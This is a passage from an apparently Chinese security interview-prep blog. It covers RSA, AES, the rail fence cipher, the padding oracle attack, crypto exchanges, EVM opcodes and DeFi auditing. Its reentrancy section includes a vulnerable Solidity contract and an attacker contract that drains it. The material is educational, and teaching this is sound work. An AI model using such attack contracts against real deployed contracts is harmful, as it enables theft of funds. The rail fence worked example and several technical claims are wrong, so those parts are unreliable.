<li><strong>优点</strong>：能够在保持较高精度的前提下，将一个复杂模型的知识转移到一个更小、推理更快的新模型上</li>
</ul>
<p><strong>4. 优化推理框架</strong></p>
<p>使用高效的推理框架可以最大化硬件性能，从而缩短时延</p>
<ul>
<li><strong>TensorRT</strong>：NVIDIA 推出的高性能深度学习推理引擎。它可以对模型进行一系列的优化，如量化、层融合（Layer Fusion）等，并为 GPU 生成高度优化的代码，从而大幅提升推理速度</li>
<li><strong>ONNX Runtime</strong>：一个跨平台的推理引擎，支持多种硬件和框架。它能够优化模型图，并选择最佳的执行路径，以提高推理性能</li>
<li><strong>OpenVINO</strong>：英特尔推出的工具套件，专门用于在英特尔硬件（如 CPU、集成显卡、VPU）上进行高效的推理部署</li>
</ul>
<p><strong>5. 硬件加速</strong></p>
<p>选择合适的硬件平台是缩减时延的根本</p>
<ul>
<li><strong>GPU（图形处理器）</strong>：对于大规模并行计算有天然优势。深度学习模型中的矩阵乘法和卷积操作都可以高效地在 GPU 上执行</li>
<li><strong>TPU（张量处理器）</strong>：谷歌专门为机器学习工作负载设计的专用集成电路（ASIC），在执行矩阵运算方面比 GPU 更高效</li>
<li><strong>FPGA（现场可编程门阵列）</strong>：可以根据模型结构进行定制化硬件设计，从而达到极高的性能和能效比</li>
<li><strong>移动端 AI 芯片</strong>：许多移动设备都集成了专门的神经处理单元（NPU），如苹果的 Neural Engine、高通的 Hexagon DSP，这些芯片专门为神经网络推理设计，具有低功耗和高效率的特点</li>
</ul>
<h1 id="29-密码学安全"><a href="#29-密码学安全" class="headerlink" title="29- 密码学安全"></a>29- 密码学安全</h1><h3 id="RSA-算法原理"><a href="#RSA-算法原理" class="headerlink" title="RSA 算法原理"></a>RSA 算法原理</h3><p>RSA 算法是一种非对称加密算法，它的名字来源于三位发明者 Rivest、Shamir 和 Adleman 的姓氏首字母。与对称加密不同，非对称加密使用一对密钥：<strong>公钥</strong>和<strong>私钥</strong>。公钥可以公开给任何人，用于加密数据；而私钥必须由用户自己保管，用于解密数据。RSA 的核心在于利用了两个数学难题：<strong>大整数质因数分解</strong>和<strong>欧拉函数</strong></p>
<p><strong>密钥生成过程</strong></p>
<p>密钥生成是 RSA 算法的基础，这个过程决定了公钥和私钥的值</p>
<ol>
<li><p><strong>选择大质数</strong>：随机选择两个非常大的质数 p 和 q。为了确保安全性，这两个质数必须足够大且不能太接近</p>
</li>
<li><p><strong>计算模数</strong>：计算它们的乘积 <code>n=p×q</code>。这个 n 就是 RSA 的模数，它既是公钥的一部分，也是私钥的一部分</p>
</li>
<li><p><strong>计算欧拉函数</strong>：计算欧拉函数 <code>ϕ(n)=(p−1)(q−1)</code>。欧拉函数 ϕ(n) 表示小于或等于 n 且与 n 互质的正整数的个数</p>
</li>
<li><p><strong>选择公钥指数</strong>：选择一个整数 e，它必须满足以下条件：</p>
<ul>
<li><p><code>1&lt;e&lt;ϕ(n)</code></p>
</li>
<li><p>e 与 ϕ(n) 互质（即最大公约数为 1）</p>
<p>通常，为了计算效率，会选择一些常见的质数，比如 65537。这个 e 就是公钥的指数</p>
</li>
</ul>
</li>
<li><p><strong>计算私钥指数</strong>：计算一个整数 d，它必须满足以下条件：</p>
<ul>
<li><p><code>d × e ≡ 1 (mod ϕ(n))</code></p>
<p>这个等式意味着 <code>d × e</code> 除以 ϕ(n) 的余数为 1。我们可以使用扩展欧几里得算法来高效地找到这个 d。这个 d 就是私钥的指数</p>
</li>
</ul>
</li>
</ol>
<p>至此，密钥生成完成。<strong>公钥为 (n,e)</strong>，可以公开；<strong>私钥为 (n,d)</strong>，必须严格保密</p>
<p><strong>加密和解密过程</strong></p>
<p>有了公钥和私钥，就可以进行数据的加密和解密了</p>
<p><strong>加密</strong></p>
<p>假设发送方想向你发送一条消息 M</p>
<ol>
<li><p>发送方获取你的公钥 (n,e)</p>
</li>
<li><p>将明文消息 M 转换为一个整数（通常通过 ASCII 或其他编码方式）</p>
</li>
<li><p>使用公钥进行加密，计算密文 C：</p>
<p><code>C = Me (mod n)</code></p>
</li>
</ol>
<p><strong>解密</strong></p>
<p>当接收方收到密文 C 后，就可以使用自己的私钥进行解密</p>
<ol>
<li><p>接收方使用自己的私钥 (n,d)</p>
</li>
<li><p>使用私钥进行解密，计算出原始明文 M：</p>
<p><code>M = C^d (mod n)</code></p>
</li>
</ol>
<p>这里看起来很简单，但其背后的数学原理是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(M^e)^d ≡ M^ed ≡ M (mod n)</span><br></pre></td></tr></table></figure>

<p>这正是<strong>欧拉定理</strong>在起作用，它保证了加密和解密的可逆性</p>
<hr>
<h3 id="AES-算法原理"><a href="#AES-算法原理" class="headerlink" title="AES 算法原理"></a>AES 算法原理</h3><p><strong>AES 的核心概念</strong></p>
<p>在深入原理之前，需要先了解 AES 的几个基本概念：</p>
<ul>
<li><strong>分组加密</strong>：AES 是一种分组密码，它将明文数据分割成固定大小的<strong>数据块</strong>（block）进行加密。AES 的数据块大小固定为 <strong>128 位</strong></li>
<li><strong>密钥长度</strong>：AES 支持三种密钥长度：<strong>128 位、192 位和 256 位</strong>。密钥长度越长，加密强度越高，但计算量也会相应增加</li>
<li><strong>加密轮数</strong>：加密过程由一系列重复的“轮”（rounds）组成。不同的密钥长度对应不同的轮数：<ul>
<li>128 位密钥：10 轮</li>
<li>192 位密钥：12 轮</li>
<li>256 位密钥：14 轮</li>
</ul>
</li>
</ul>
<p><strong>加密过程的四大步骤</strong></p>
<p>每一次加密轮都由四个基本操作构成，这些操作保证了加密过程的复杂性</p>
<ol>
<li><strong>字节替换（SubBytes）</strong> 这是<strong>代换</strong>操作。AES 使用一个预先定义好的 <strong>S-Box</strong>（Substitution-Box），将数据块中的每个字节替换成 S-Box 中对应的另一个字节。这个操作是非线性的，目的是为了隐藏明文和密文之间的直接代数关系</li>
<li><strong>行移位（ShiftRows）</strong> 这是<strong>置换</strong>操作。它将数据块中的每一行进行循环左移。具体来说：<ul>
<li>第 0 行保持不变</li>
<li>第 1 行循环左移 1 个字节</li>
<li>第 2 行循环左移 2 个字节</li>
<li>第 3 行循环左移 3 个字节。 这个操作实现了数据字节在不同列之间的扩散，增加了密码的混淆程度</li>
</ul>
</li>
<li><strong>列混淆（MixColumns）</strong> 这也是<strong>置换</strong>操作。这个步骤对每一列进行矩阵乘法运算。通过这个操作，每一列中的每个字节都会影响到该列中其他字节的值。这进一步加大了数据的扩散，确保了明文中的微小变化能够导致密文的巨大变化</li>
<li><strong>轮密钥加（AddRoundKey）</strong> 这是<strong>异或</strong>（XOR）操作。在每一轮开始时，都会将当前数据块与<strong>本轮的密钥</strong>进行异或运算。这个操作将密钥信息注入到数据中，是整个加密过程的关键步骤。每一轮使用的密钥都是由初始密钥经过<strong>密钥扩展</strong>算法生成的</li>
</ol>
<p>这四个步骤按顺序重复执行多次，最后<strong>在最后一轮会省略列混淆步骤</strong>。解密过程则反向执行这四个步骤</p>
<hr>
<h3 id="说一下非对称加密算法的加密过程"><a href="#说一下非对称加密算法的加密过程" class="headerlink" title="说一下非对称加密算法的加密过程"></a>说一下非对称加密算法的加密过程</h3><p><strong>加密过程详解</strong></p>
<p>非对称加密的整个过程可以分为以下几个关键步骤：</p>
<ol>
<li><p><strong>密钥生成</strong>： 首先，接收方（比如你）会生成一对密钥：一个<strong>公钥</strong>和一个<strong>私钥</strong>。这个过程通常基于复杂的数学难题，例如大整数分解（RSA 算法）或椭圆曲线上的离散对数问题（ECC 算法）</p>
<ul>
<li><strong>公钥</strong>：可以公开给任何人，就像你的电子邮箱地址</li>
<li><strong>私钥</strong>：必须严格保密，只有你自己能访问，就像你的邮箱密码</li>
</ul>
</li>
<li><p><strong>公钥分发</strong>： 当发送方（比如你的朋友）想要给你发送加密信息时，他首先需要获得你的公钥。你可以通过一个安全的渠道，例如你的网站、社交媒体账号或证书颁发机构，将公钥发给你的朋友</p>
</li>
<li><p><strong>消息加密</strong>： 你的朋友拿到你的公钥后，就可以开始加密信息了。他将原始的明文信息（如“你好”）转换成数字格式，然后使用你的<strong>公钥</strong>和加密算法对信息进行加密。 加密后的信息会变成一串看似随机的乱码，这就是<strong>密文</strong></p>
<p><strong>加密原理</strong>： <code>密文 = 加密算法 (明文, 接收方的公钥)</code></p>
</li>
<li><p><strong>密文传输</strong>： 加密完成后，你的朋友就可以将密文通过不安全的渠道发送给你，例如电子邮件、即时通讯软件或短信。即使这段信息在传输过程中被截获，攻击者也无法通过公钥解密出原始信息，因为公钥只能用于加密，不能用于解密</p>
</li>
<li><p><strong>消息解密</strong>： 当你收到密文后，你需要使用你自己的<strong>私钥</strong>来解密。你将密文输入解密算法，并使用你的私钥进行运算，最终得到原始的明文信息</p>
<p><strong>解密原理</strong>： <code>明文 = 解密算法 (密文, 接收方的私钥)</code></p>
<hr>
</li>
</ol>
<h3 id="有哪些了解过的非对称加密算法"><a href="#有哪些了解过的非对称加密算法" class="headerlink" title="有哪些了解过的非对称加密算法"></a>有哪些了解过的非对称加密算法</h3><p><strong>1. RSA 算法</strong></p>
<p><strong>RSA</strong> 是最著名的非对称加密算法之一，它的名字来源于三位发明者 Rivest、Shamir 和 Adleman 的姓氏首字母</p>
<ul>
<li><strong>核心原理</strong>：它的安全性基于<strong>大整数质因数分解</strong>的数学难题。这意味着，即使知道两个非常大的质数相乘得到的乘积，也很难在合理时间内将这个乘积分解回原来的两个质数</li>
<li><strong>优点</strong>：历史悠久，经过了长时间的考验和广泛应用，安全性被普遍认可</li>
<li><strong>缺点</strong>：相比其他算法，其密钥长度通常需要更长来达到相同的安全级别，导致加密和解密速度较慢</li>
</ul>
<p><strong>2. ECC（椭圆曲线密码学）算法</strong></p>
<p><strong>ECC</strong> 是一种基于<strong>椭圆曲线</strong>数学的非对称加密算法</p>
<ul>
<li><strong>核心原理</strong>：它的安全性基于<strong>椭圆曲线上的离散对数问题</strong>。这个问题的难度要比大整数分解问题高得多</li>
<li><strong>优点</strong>：在相同的安全强度下，ECC 的密钥长度比 RSA 短得多。例如，一个 256 位的 ECC 密钥提供的安全性，与一个 3072 位的 RSA 密钥大致相当。更短的密钥意味着更高的计算效率和更小的存储空间，这对于移动设备和物联网等资源受限的环境非常有利</li>
<li><strong>缺点</strong>：数学原理更复杂，实现起来也更困难</li>
</ul>
<p><strong>3. DSA（数字签名算法）</strong></p>
<p><strong>DSA</strong> 是一种主要用于<strong>数字签名</strong>的非对称加密算法</p>
<ul>
<li><strong>核心原理</strong>：它基于<strong>离散对数问题</strong>，与 Diffie-Hellman 密钥交换算法的数学基础类似</li>
<li><strong>优点</strong>：专为数字签名设计，效率较高。它只用于签名，不用于数据加密</li>
<li><strong>缺点</strong>：只能用于签名和验证，不能用于数据的加密和解密</li>
</ul>
<hr>
<h3 id="栅栏密码的原理是什么"><a href="#栅栏密码的原理是什么" class="headerlink" title="栅栏密码的原理是什么"></a>栅栏密码的原理是什么</h3><p><strong>加密原理</strong></p>
<p>栅栏密码的原理是，将明文的字母像写在交错的栅栏上一样，然后按行读取</p>
<ol>
<li><strong>选择密钥</strong>：首先，你需要选择一个密钥，这个密钥就是一个整数，表示“栅栏”的层数。例如，密钥为 3，就表示有 3 层栅栏</li>
<li><strong>构造栅栏</strong>：将明文的字母按照“之”字形（zig-zag）的路径，依次填写到对应层数的栅栏上</li>
<li><strong>按行读取</strong>：加密后的密文就是将每一层栅栏上的字母，从上到下、从左到右依次连接起来</li>
</ol>
<p><strong>示例：</strong></p>
<ul>
<li><strong>明文</strong>：<code>WE ARE DISCOVERED. FLEE AT ONCE.</code></li>
<li><strong>密钥</strong>：<code>3</code></li>
</ul>
<p>我们将明文写在 3 层栅栏上：</p>
<p>现在，我们按行读取，忽略点号，只提取字母：</p>
<ul>
<li><strong>第一行</strong>：<code>WEDOEE</code></li>
<li><strong>第二行</strong>：<code>ERDSOEFETNC</code></li>
<li><strong>第三行</strong>：<code>AICSVRAOC</code></li>
</ul>
<p>将三行连接起来，就得到了密文：</p>
<p><strong>密文</strong>：<code>WEDOEE ERDSOEFETNC AICSVRAOC</code></p>
<p><strong>解密原理</strong></p>
<p>解密过程是加密的逆向操作，你需要知道密钥和密文的长度</p>
<ol>
<li><strong>计算每行长度</strong>：根据密钥和密文长度，计算出每一层栅栏上的字母数量</li>
<li><strong>重构栅栏</strong>：根据计算出的数量，将密文依次填回到“之”字形的栅栏结构中</li>
<li><strong>按“之”字形读取</strong>：最后，按照原来的“之”字形路径，依次读取每个位置上的字母，就能还原出原始明文</li>
</ol>
<hr>
<h3 id="Padding-Oracle-Attack-讲讲"><a href="#Padding-Oracle-Attack-讲讲" class="headerlink" title="Padding Oracle Attack 讲讲"></a>Padding Oracle Attack 讲讲</h3><p><strong>攻击的核心原理</strong></p>
<p>要理解这个攻击，我们首先需要了解几个关键概念：</p>
<p><strong>1. 分组密码和 CBC 模式</strong></p>
<ul>
<li><strong>分组密码</strong>将明文分割成固定大小的<strong>分组</strong>进行加密</li>
<li><strong>CBC（密文分组链接）模式</strong>是一种常用的分组密码模式。在 CBC 模式中，每个明文分组在加密前，会先与前一个密文分组进行<strong>异或</strong>（XOR）运算。这使得每个密文分组都依赖于其之前的所有分组，从而提供了更好的安全性</li>
<li><strong>IV（初始化向量）</strong>：第一个明文分组加密时没有前一个密文分组，因此需要一个<strong>初始化向量</strong>（IV）来代替</li>
</ul>
<p><strong>2. 填充（Padding）</strong></p>
<p>为了确保最后一个明文分组能够填满整个分组长度，需要进行<strong>填充</strong>。例如，如果分组大小是 16 字节，而最后一个明文分组只有 13 字节，就需要填充 3 个字节。 <strong>PKCS#7 填充</strong>是常用的填充标准。它将填充的每个字节都设置为填充的长度。例如，如果需要填充 3 个字节，就会在明文末尾添加 <code>0x03 0x03 0x03</code>。解密后，系统会检查最后一个字节的值，并移除相应数量的填充</p>
<p><strong>攻击的步骤</strong></p>
<p>Padding Oracle Attack 利用的就是<strong>填充验证机制</strong>的漏洞。攻击者通过发送修改后的密文到服务器，并观察服务器是否返回“填充正确”或“填充错误”的信息。这个“神谕”（Oracle）就是指服务器的这个响应行为</p>
<p>攻击者可以<strong>逐字节地</strong>解密密文。假设我们要解密密文分组 Cn：</p>
<ol>
<li><strong>构造密文</strong>：攻击者需要控制一个密文分组 Cn−1′（通常是伪造的）和一个目标密文分组 Cn</li>
<li><strong>暴力破解</strong>：攻击者会尝试 Cn−1′ 的最后一个字节，从 0 到 255 遍历所有可能的值</li>
<li><strong>发送给服务器</strong>：将伪造的 <code>(IV + C_0 + ... + C_&#123;n-2&#125; + C_&#123;n-1&#125;&#39; + C_n)</code> 发送给服务器</li>
<li><strong>观察响应</strong>：<ul>
<li>如果服务器返回**“填充正确”**，说明填充字节的解密结果为 <code>0x01</code></li>
<li>如果服务器返回**“填充错误”**，说明填充字节的解密结果不为 <code>0x01</code></li>
</ul>
</li>
<li><strong>推导</strong>：<ul>
<li>当我们找到一个让服务器返回“填充正确”的 Cn−1′ 时，根据CBC模式的解密公式： <code>$P_n = D(C_n) \oplus C_&#123;n-1&#125;$</code></li>
<li>那么，伪造的密文解密后，其最后一个明文字节为 <code>0x01</code>： <code>$P_n&#39;[last] = D(C_n)[last] \oplus C_&#123;n-1&#125;&#39;[last] = 0x01$</code></li>
<li>我们可以推导出 <code>D(C_n)[last]</code> 的值： <code>$D(C_n)[last] = P_n&#39;[last] \oplus C_&#123;n-1&#125;&#39;[last] = 0x01 \oplus C_&#123;n-1&#125;&#39;[last]$</code></li>
<li>既然我们已经知道了 D(Cn) 的最后一个字节，我们就可以用同样的方法，依次解密倒数第二个字节、倒数第三个字节……</li>
<li>每解密一个字节，攻击者就构造一个新的 Cn−1′，使得它能让下一个填充字节的解密结果为 <code>0x02</code>，然后继续这个过程，直到解密完整个分组</li>
</ul>
</li>
</ol>
<hr>
<h1 id="30-区块链安全"><a href="#30-区块链安全" class="headerlink" title="30- 区块链安全"></a>30- 区块链安全</h1><h3 id="说说交易所"><a href="#说说交易所" class="headerlink" title="说说交易所"></a>说说交易所</h3><p><strong>什么是加密货币交易所？</strong></p>
<p>加密货币交易所（Crypto Exchange）是允许用户交易（买卖）加密货币的平台。你可以把它想象成一个数字化的股票交易所，只不过交易的对象从股票、债券变成了比特币、以太坊等数字资产</p>
<p><strong>交易所的运作模式</strong></p>
<p>交易所的核心功能是撮合买卖双方的交易。这通常通过一个<strong>订单簿</strong>（Order Book）系统来实现。</p>
<p><strong>订单簿</strong></p>
<p>订单簿记录了所有用户提交的买入和卖出订单。一个典型的订单簿包括：</p>
<ul>
<li><strong>买单（Bid）</strong>：用户想要以某个价格买入加密货币的意向</li>
<li><strong>卖单（Ask）</strong>：用户想要以某个价格卖出加密货币的意向</li>
</ul>
<p>当一个买单的价格与一个卖单的价格相匹配时，交易就会自动执行。这个匹配的价格就是<strong>市场价格</strong></p>
<p><strong>交易深度</strong></p>
<p>交易深度（Market Depth）是订单簿中各个价格点的买卖订单数量总和。它反映了市场的流动性：</p>
<ul>
<li><strong>深度高</strong>：意味着在当前价格附近有大量的买卖订单。即使有大额交易，价格也不会出现剧烈波动，市场流动性好</li>
<li><strong>深度低</strong>：意味着订单稀少。一笔大额交易就可能导致价格大幅波动，市场流动性差</li>
</ul>
<p><strong>交易手续费</strong></p>
<p>交易所通过收取交易手续费来盈利。手续费通常按交易金额的一定比例收取，具体费率取决于用户的交易量、持有平台币（如币安的 BNB）的情况以及 VIP 等级</p>
<p><strong>交易所的类型</strong></p>
<p>根据其运作方式和中心化程度，交易所可以分为以下几大类：</p>
<p><strong>1. 中心化交易所（CEX）</strong></p>
<p>这是目前最主流的交易所类型，如币安（Binance）、Coinbase、欧易（OKX）</p>
<p><strong>特点：</strong></p>
<ul>
<li><strong>中心化管理</strong>：所有用户的资产都存放在交易所的钱包里，用户没有私钥的完全控制权。你相信交易所来保管你的资产</li>
<li><strong>高性能</strong>：交易都在链下（Off-chain）进行，速度快，吞吐量高，能够处理大量高频交易</li>
<li><strong>功能丰富</strong>：除了现货交易，通常还提供合约交易、杠杆交易、理财产品、IEO（首次交易所发行）等服务</li>
<li><strong>监管和合规</strong>：为了保护用户和应对监管要求，CEX通常需要用户完成<strong>KYC</strong>（Know Your Customer，了解你的客户）身份认证</li>
</ul>
<p><strong>优势：</strong></p>
<ul>
<li><strong>易用性</strong>：用户界面友好，操作简单，适合新手</li>
<li><strong>流动性好</strong>：拥有庞大的用户基础和交易量</li>
<li><strong>安全性（相对）</strong>：由专业团队维护，有更完善的安全措施和风控系统（如冷钱包存储、多重签名等），但仍存在被黑客攻击的风险。</li>
</ul>
<p><strong>2. 去中心化交易所（DEX）</strong></p>
<p>DEX 是基于区块链智能合约运行的交易所，如Uniswap、PancakeSwap</p>
<p><strong>特点：</strong></p>
<ul>
<li><strong>去中心化</strong>：资产直接由用户的钱包控制，用户掌握私钥，无需将资产托管给第三方</li>
<li><strong>无须许可</strong>：任何人都可以通过提供流动性成为做市商，无需注册或 KYC</li>
<li><strong>自动化做市商（AMM）</strong>：DEX 多采用 AMM 模式，而不是传统的订单簿。流动性提供者（LP）将两种代币存入一个<strong>流动性池</strong>，交易者可以直接与这个流动性池进行交易</li>
<li><strong>链上交易</strong>：每笔交易都在区块链上进行，公开透明，但受限于区块链本身的性能（速度和费用）</li>
</ul>
<p><strong>优势：</strong></p>
<ul>
<li><strong>资产自主权</strong>：用户完全控制自己的资产，不存在交易所跑路或被盗的风险</li>
<li><strong>抗审查性</strong>：不受单一实体控制，难以被关闭或冻结</li>
<li><strong>隐私性</strong>：无需 KYC</li>
</ul>
<p><strong>劣势：</strong></p>
<ul>
<li><strong>易用性相对较差</strong>：需要用户自己管理钱包和私钥，对新手不太友好</li>
<li><strong>滑点问题</strong>：对于大额交易，AMM 模式可能会出现较高的滑点</li>
<li><strong>无偿损失</strong>：流动性提供者可能会面临无偿损失（Impermanent Loss）的风险</li>
</ul>
<p><strong>3. 混合交易所（Hybrid Exchange）</strong></p>
<p>混合交易所试图结合 CEX 和 DEX 的优点，通常将部分功能（如订单撮合）放在链下以提高效率，而将资产结算和托管放在链上以确保安全和去中心化。这种模式目前仍在发展中，但尚未成为主流</p>
<hr>
<h3 id="讲一讲区块链逆向函数涉及到的接收参数的指令集"><a href="#讲一讲区块链逆向函数涉及到的接收参数的指令集" class="headerlink" title="讲一讲区块链逆向函数涉及到的接收参数的指令集"></a>讲一讲区块链逆向函数涉及到的接收参数的指令集</h3><p>当你在逆向一个 EVM 字节码时，你会发现函数参数的传递和处理主要涉及到以下几种指令集和概念：</p>
<p><strong>1. <code>CALLDATALOAD</code> 和 <code>CALLDATASIZE</code></strong></p>
<ul>
<li><strong><code>CALLDATALOAD</code></strong>: 这个指令用于从**交易的调用数据（calldata）**中加载参数。<code>calldata</code> 是一个只读的、外部调用的数据区域，它存储了函数选择器（Function Selector）和所有传入的参数。<code>CALLDATALOAD</code> 接收一个内存偏移量作为参数，然后从该偏移量处加载一个32字节（256位）的数据到栈顶<ul>
<li><strong>逆向分析中的应用</strong>: 当你看到一个 <code>CALLDATALOAD</code> 指令时，你需要查看它加载的偏移量<ul>
<li><code>0x04</code> 偏移量通常是第一个参数的开始。这是因为前4个字节（<code>0x00</code>到<code>0x03</code>）是函数选择器，用于识别要调用的函数</li>
<li>随后的偏移量（例如 <code>0x24</code>、<code>0x44</code> 等）则对应后续的参数</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>CALLDATASIZE</code></strong>: 这个指令用于获取 <code>calldata</code> 的总大小。在逆向分析中，它通常用于进行边界检查，确保传入的参数数量和大小是正确的</li>
</ul>
<p><strong>2. <code>ISZERO</code> 和 <code>JUMPI</code></strong></p>
<ul>
<li><strong><code>ISZERO</code></strong>: 这是一个判断指令，用于检查栈顶的值是否为零。在处理参数时，它通常用于检查某个参数是否为空或为0</li>
<li><strong><code>JUMPI</code></strong>: 这是一个条件跳转指令。它接收两个参数：一个目标地址和一个条件。如果条件非零，程序执行流将跳转到目标地址<ul>
<li><strong>逆向分析中的应用</strong>: 你会看到 <code>ISZERO</code> 和 <code>JUMPI</code> 常常配合使用，用于<strong>函数签名检查</strong>。当函数签名（前4个字节）与预期的签名不匹配时，<code>JUMPI</code> 就会将程序跳转到错误处理代码块，如 <code>revert</code> 或 <code>invalid jump</code>。这是逆向分析中识别不同函数入口点的关键</li>
</ul>
</li>
</ul>
<p><strong>3. <code>EQ</code>, <code>LT</code>, <code>GT</code> (比较指令)</strong></p>
<ul>
<li><strong><code>EQ</code></strong>: 比较栈顶的两个值是否相等</li>
<li><strong><code>LT</code></strong>: 比较栈顶的第一个值是否小于第二个值</li>
<li><strong><code>GT</code></strong>: 比较栈顶的第一个值是否大于第二个值<ul>
<li><strong>逆向分析中的应用</strong>: 这些比较指令经常用于对传入的参数进行验证，例如检查一个数值参数是否在某个范围内，或者一个地址参数是否等于合约所有者的地址</li>
</ul>
</li>
</ul>
<p><strong>4. <code>MSTORE</code> 和 <code>MLOAD</code></strong></p>
<p>虽然这两个指令不直接用于接收参数，但在处理和使用参数时它们是不可或缺的</p>
<ul>
<li><strong><code>MSTORE</code></strong>: 将栈顶的32字节数据存储到指定的内存（Memory）位置</li>
<li><strong><code>MLOAD</code></strong>: 从指定的内存位置加载32字节数据到栈顶<ul>
<li><strong>逆向分析中的应用</strong>: 传入的参数通常会先从 <code>calldata</code> 加载到栈上，然后使用 <code>MSTORE</code> 存储到内存中以供后续计算或处理。当你看到一个 <code>MSTORE</code> 指令时，它通常意味着一个参数正在被复制到内存中</li>
</ul>
</li>
</ul>
<hr>
<h3 id="说说重入漏洞"><a href="#说说重入漏洞" class="headerlink" title="说说重入漏洞"></a>说说重入漏洞</h3><p><strong>什么是重入漏洞？</strong></p>
<p>简单来说，重入漏洞发生在以下情况： 一个智能合约在<strong>调用外部合约或地址</strong>（如通过<code>call</code>、<code>send</code>或<code>transfer</code>发送以太币）之后，<strong>未及时更新内部状态</strong></p>
<p>当外部合约或地址接收到以太币时，它可以执行一个<strong>回退函数</strong>（Fallback Function）。如果这个回退函数中又包含一个对原始合约的调用，那么它就可以在原始合约的状态（比如余额记录）更新之前，再次执行之前的函数，形成一个无限循环，直到合约中的以太币被取光</p>
<p><strong>重入漏洞的经典案例：The DAO</strong></p>
<p>最具代表性的重入漏洞攻击是发生在 2016 年的 <strong>The DAO</strong> 事件。当时，黑客利用这个漏洞从 The DAO 智能合约中盗取了价值超过 6000 万美元的以太币。这次攻击导致了以太坊社区的巨大分歧，最终促成了以太坊（ETH）和以太坊经典（ETC）的分叉</p>
<p><strong>重入漏洞的工作原理</strong></p>
<p>我们以一个简单的取款合约为例来详细解释这个过程：</p>
<p><strong>存在漏洞的合约代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract VulnerableContract &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        // 步骤 1: 检查用户余额</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        // 步骤 2: 将以太币发送给用户</span><br><span class="line">        // 这是一个危险的操作，因为`call`会触发接收方的回退函数</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed.&quot;);</span><br><span class="line"></span><br><span class="line">        // 步骤 3: 更新用户余额</span><br><span class="line">        // 这步在外部调用之后，是漏洞的关键</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 其他函数...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>黑客合约代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract Attacker &#123;</span><br><span class="line">    VulnerableContract vulnerableContract;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerableContract) &#123;</span><br><span class="line">        vulnerableContract = VulnerableContract(_vulnerableContract);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 步骤 1: 首次调用受害合约的提款函数</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        vulnerableContract.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 步骤 2: 回退函数，当接收到以太币时被触发</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        // 如果受害合约的余额大于 0，再次调用它的提款函数</span><br><span class="line">        if (address(vulnerableContract).balance &gt; 0) &#123;</span><br><span class="line">            vulnerableContract.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>攻击流程解析：</strong></p>
<ol>
<li><strong>准备</strong>：黑客向 <code>VulnerableContract</code> 存入少量以太币，以获得一个非零的余额</li>
<li><strong>首次调用</strong>：黑客通过 <code>Attacker</code> 合约调用 <code>VulnerableContract</code> 的 <code>withdraw()</code> 函数</li>
<li><strong>漏洞触发</strong>：<ul>
<li><code>VulnerableContract</code> 检查黑客余额，然后向 <code>Attacker</code> 合约发送以太币</li>
<li><code>Attacker</code> 合约接收到以太币后，其 <code>fallback</code> 函数被立即触发</li>
<li>在 <code>fallback</code> 函数中，黑客再次调用 <code>VulnerableContract</code> 的 <code>withdraw()</code> 函数</li>
</ul>
</li>
<li><strong>递归循环</strong>：<ul>
<li>由于 <code>VulnerableContract</code> 的 <code>balances[msg.sender] = 0</code> 这一行代码<strong>尚未执行</strong>，<code>VulnerableContract</code> 以为黑客的余额仍然存在</li>
<li><code>withdraw()</code> 函数再次执行，又一次向 <code>Attacker</code> 合约发送以太币，再次触发 <code>fallback</code> 函数</li>
</ul>
</li>
<li><strong>耗尽资金</strong>：这个过程会反复进行，直到 <code>VulnerableContract</code> 中的所有以太币被耗尽</li>
</ol>
<hr>
<h3 id="在-DeFi-项目中建立了各种各样的经济模型，怎样才能找出可能存在的漏洞"><a href="#在-DeFi-项目中建立了各种各样的经济模型，怎样才能找出可能存在的漏洞" class="headerlink" title="在 DeFi 项目中建立了各种各样的经济模型，怎样才能找出可能存在的漏洞"></a>在 DeFi 项目中建立了各种各样的经济模型，怎样才能找出可能存在的漏洞</h3><p><strong>1. 深入理解协议设计</strong></p>
<p>在审计代码之前，首先要<strong>彻底理解协议的白皮书和经济模型</strong>。你需要问自己一些核心问题：</p>
<ul>
<li><strong>激励机制</strong>：协议如何激励用户参与？例如，流动性挖矿的奖励是如何计算和分配的？这些激励是否可持续？</li>
<li><strong>惩罚机制</strong>：当用户行为不符合协议预期时（例如，借贷逾期、清算失败），如何进行惩罚？惩罚是否足够威慑？</li>
